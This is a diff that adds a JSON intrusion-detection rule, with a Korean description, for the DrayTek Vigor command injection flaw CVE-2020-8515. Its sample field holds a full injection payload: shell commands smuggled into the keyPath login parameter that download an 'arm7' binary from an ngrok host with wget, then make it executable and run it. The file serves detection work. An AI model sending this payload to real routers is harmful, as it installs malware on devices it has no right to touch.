@@ -1,0 +1,11 @@
+{
+	"Name": "DrayTek Vigor Remote Code Execution",
+	"Description": "/cgi-bin/mainfunction.cgi URI에 대한 루트 권한의 원격 코드 실행을 허용 \r\n formLogin()에 전달되는 keyPath값을 적절하게 검증하지 못하여 발생 \r\n 공격자는 해당 취약점을 악용하여 네트워크 트래픽 스니핑 및 백도어 설치 등이 가능.",
+	"References": ["CVE-2020-8515"],
+	"Samples": [
+		"/cgi-bin/mainfunction.cgi?action=login&keyPath='/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/ar${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7''&loginUser=a&loginPwd=a",
+		"POST /cgi-bin/mainfunction.cgi HTTP/1.1"
+		   ],
+	"Keywords": [["cgi-bin", "mainfunction.cgi"], ["keyPath"], ["rtick"], ["loginUser"]],
+	"Signature": []
+}
